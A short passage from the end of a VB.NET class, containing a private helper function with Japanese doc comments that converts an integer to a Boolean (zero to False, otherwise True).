    End Function

    ''' <summary>
    ''' Integer型をBool型に変換する
    ''' </summary>
    ''' <param name="value"></param>
    ''' <returns></returns>
    ''' <remarks>True:0以外 False:0</remarks>
    Private Function Int2Bool(value As Integer) As Boolean
        Dim ret As Boolean = True

        Try
            If value = 0 Then
                ret = False
            End If
        Catch
        End Try

        Return ret
    End Function

#End Region

End Class
